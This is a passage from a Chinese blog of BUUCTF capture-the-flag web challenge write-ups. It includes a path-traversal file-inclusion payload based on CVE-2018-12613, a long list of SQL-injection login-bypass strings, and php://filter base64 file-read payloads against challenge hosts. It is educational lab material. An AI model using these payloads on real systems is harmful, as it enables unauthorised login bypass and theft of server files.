it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            echo <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! empty($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>mt_strpos所起到的作用是返回目标字符串首次出现的位置,联系mb_substr所起到的作用是截取目标字符串对应位置的内容,结合起来就是返回传入变量$page匹配到第一个?之前的内容,直接用CVE-2018-12613的poc和hint.php的内容利用文件包含构造<br>?file=hint.php%253f/../../../../../ffffllllaaaagggg</p>
<h1 id="极客大挑战-2019-EasySQL1"><a href="#极客大挑战-2019-EasySQL1" class="headerlink" title="[极客大挑战 2019]EasySQL1"></a>[极客大挑战 2019]EasySQL1</h1><p><img src="https://img-blog.csdnimg.cn/20210616095251443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这个是比较简单的sql注入，可以先判断<br><img src="https://img-blog.csdnimg.cn/20210616095348463.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><em><em>SQL注入万能密码：’or’=’or’<br>admin<br>admin’–<br>admin’ or 4=4–<br>admin’ or ‘1’=’1’–<br>admin888<br>“or “a”=”a<br>admin’ or 2=2#<br>a’ having 1=1#<br>a’ having 1=1–<br>admin’ or ‘2’=’2<br>‘)or(‘a’=’a<br>or 4=4–<br>c<br>a’or’ 4=4–<br>“or 4=4–<br>‘or’a’=’a<br>“or”=”a’=’a<br>‘or’’=’<br>‘or’=’or’<br>1 or ‘1’=’1’=1<br>1 or ‘1’=’1’ or 4=4<br>‘OR 4=4%00<br>“or 4=4%00<br>‘xor<br>admin’ UNION Select 1,1,1 FROM admin Where ‘’=’<br>1<br>-1%cf’ union select 1,1,1 as password,1,1,1 %23<br>1<br>17..admin’ or ‘a’=’a 密码随便<br>‘or’=’or’<br>‘or 4=4/</em><br>something<br>‘ OR ‘1’=’1<br>1’or’1’=’1<br>admin’ OR 4=4/</em><br>1’or’1’=’1**<br>本题使用的是admin’ or ‘1’=’1’#，1=1永真，而且#可以注释掉后面的语句，所以密码是什么不重要。<br><img src="https://img-blog.csdnimg.cn/20210616100051512.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="极客大挑战-2019-Havefun1"><a href="#极客大挑战-2019-Havefun1" class="headerlink" title="[极客大挑战 2019]Havefun1"></a>[极客大挑战 2019]Havefun1</h1><p><img src="https://img-blog.csdnimg.cn/20210616101006980.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">       $cat=$_GET[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line">       echo $cat;</span><br><span class="line">       <span class="keyword">if</span>($cat==<span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line">           echo <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       --&gt;</span><br></pre></td></tr></table></figure>
<p>由题可知需要用get的方式上传cat=dog，<a target="_blank" rel="noopener" href="http://d3a8ff66-7665-4869-875d-e693623fb2d3.node3.buuoj.cn/?cat=dog%EF%BC%8C%E5%8D%B3%E5%8F%AF%E6%8B%BF%E5%88%B0flag%E3%80%82">http://d3a8ff66-7665-4869-875d-e693623fb2d3.node3.buuoj.cn/?cat=dog，即可拿到flag。</a></p>
<h1 id="ACTF2020-新生赛-Include1"><a href="#ACTF2020-新生赛-Include1" class="headerlink" title="[ACTF2020 新生赛]Include1"></a>[ACTF2020 新生赛]Include1</h1><p><img src="https://img-blog.csdnimg.cn/20210617201449551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">这是一道文件包含漏洞题，点击tips<br><img src="https://img-blog.csdnimg.cn/20210617201611545.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><strong>/?file=php://filter/read=convert.base64-encode/resource=flag.php</strong>,出现base64形式，即可。<br><img src="https://img-blog.csdnimg.cn/20210617204031518.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="CTF-极客大挑战-2019-Secret-File"><a href="#CTF-极客大挑战-2019-Secret-File" class="headerlink" title="CTF [极客大挑战 2019]Secret File"></a>CTF [极客大挑战 2019]Secret File</h1><p>知识点：<br>    一、前端中背景可以覆盖内容，页面源代码可以查看完整的html<br>    二、在php文件中可以写入html代码，html可在前端展示出来，php代码主要是处理数据，通常不会展示。<br>    三、文件包含漏洞，PHP伪协议获取文件</p>
<p>php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</p>
<p>环境概要：<br>PHP.ini：<br>allow_url_fopen ：on 默认开启 该选项为on便是激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象文件等。<br>allow_url_include：off 默认关闭，该选项为on便是允许 包含URL 对象文件等。<br><img src="https://img-blog.csdnimg.cn/20210618170550263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看源代码<br>发现有被隐藏的网页Archive_room.php，打开<br><img src="https://img-blog.csdnimg.cn/20210618170750945.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">点击SECRET，<img src="https://img-blog.csdnimg.cn/20210618170819766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">快速跳转，需要抓包<br><img src="https://img-blog.csdnimg.cn/20210618170922790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">发现在secr3t.php<br><img src="https://img-blog.csdnimg.cn/20210618171021447.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现flag在flag.php上<br><img src="https://img-blog.csdnimg.cn/20210618171132250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MzU0OTQyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">是文件包含漏洞，直接构造view-source:<a target="_blank" rel="noopener" href="http://afffc056-5cff-4ef2-aa1f-61d65effcc4c.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php%EF%BC%8C%E6%9C%80%E5%90%8E%E7%BC%96%E7%A0%81%E5%8D%B3%E5%8F%AF">http://afffc056-5cff-4ef2-aa1f-61d65effcc4c.node3.buuoj.cn/secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php，最后编码即可</a></p>

        </div>
    

</div>
            
        </section>
    </div>
</div>



    <div class="row">
        <div class="col-sm-12">
            <div class="wrap-pagination">
                <a class="disabled" href="/">
                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
                </a>
                <a class="" href="/page/2/">
                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
                </a>
            </div>
        </div>
    </div>




</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    This theme was developed by <a target="_blank" rel="noopener" href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2021/08/08/PHP%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/">PHP魔术方法</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2021/08/08/PHP%E4%B8%8D%E6%AD%BB%E9%A9%AC/">PHP不死马</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2021/08/08/buuctf_php/">buuctf_php</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2021/08/01/%E8%AE%A1%E7%BD%91%E7%BD%91%E7%BB%9C%E7%AF%87/">计网网络篇</a>
            </li>
            
        </ul>
    </div>



            
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://twitter.com/?lang=en">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.facebook.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.instagram.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-instagram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://dribbble.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-dribbble"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://telegram.org/">
                            <span class="footer-icon-container">
                                <i class="fa fa-telegram"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://www.behance.net/">
                            <span class="footer-icon-container">
                                <i class="fa fa-behance"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a target="_blank" rel="noopener" href="https://500px.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-500px"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:test@example.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="\#">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @Untitled. All right reserved | Design & Hexo <a target="_blank" rel="noopener" href="http://www.codeblocq.com/">Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->

<script src="/js/main.js"></script>


<!-- Disqus Comments -->



</body>

</html>